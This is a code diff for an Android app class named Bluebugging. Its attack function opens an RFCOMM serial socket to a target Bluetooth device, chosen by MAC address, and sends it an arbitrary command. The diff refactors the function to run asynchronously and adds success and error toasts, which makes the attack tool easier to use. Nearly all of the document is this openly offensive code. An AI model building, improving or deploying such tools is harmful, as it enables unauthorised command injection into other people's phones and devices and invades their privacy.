@@ -9,19 +9,23 @@ import androidx.core.app.ActivityCompat
 import java.io.IOException
 import java.util.*
 
+import android.widget.Toast
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
+
 class Bluebugging(
     private val context: Context,
     private val bluetoothAdapter: BluetoothAdapter?
 ) {
-    fun attack(macAddress: String, command: String) {
+    suspend fun attack(macAddress: String, command: String) {
         if (bluetoothAdapter == null) {
-            // Handle Bluetooth not supported
+            // TODO: Propagate error to UI: Bluetooth not supported
             return
         }
 
         val device: BluetoothDevice? = bluetoothAdapter.getRemoteDevice(macAddress)
         if (device == null) {
-            // Handle device not found
+            // TODO: Propagate error to UI: Device not found
             return
         }
 
@@ -30,19 +34,27 @@ class Bluebugging(
                 Manifest.permission.BLUETOOTH_CONNECT
             ) != PackageManager.PERMISSION_GRANTED
         ) {
-            // Handle missing permission
+            // TODO: Propagate error to UI: Missing permission
             return
         }
 
-        val uuid = UUID.fromString("00001101-0000-1000-8000-00805f9b34fb")
-        try {
-            val socket = device.createRfcommSocketToServiceRecord(uuid)
-            socket.connect()
-            val outputStream = socket.outputStream
-            outputStream.write(command.toByteArray())
-            socket.close()
-        } catch (e: IOException) {
-            e.printStackTrace()
+        withContext(Dispatchers.IO) {
+            try {
+                val uuid = UUID.fromString("00001101-0000-1000-8000-00805f9b34fb")
+                device.createRfcommSocketToServiceRecord(uuid).use { socket ->
+                    socket.connect()
+                    val outputStream = socket.outputStream
+                    outputStream.write(command.toByteArray())
+                    withContext(Dispatchers.Main) {
+                        Toast.makeText(context, "Command sent", Toast.LENGTH_SHORT).show()
+                    }
+                }
+            } catch (e: IOException) {
+                withContext(Dispatchers.Main) {
+                    Toast.makeText(context, "Error: ${e.message}", Toast.LENGTH_LONG).show()
+                }
+                e.printStackTrace()
+            }
         }
     }
 }
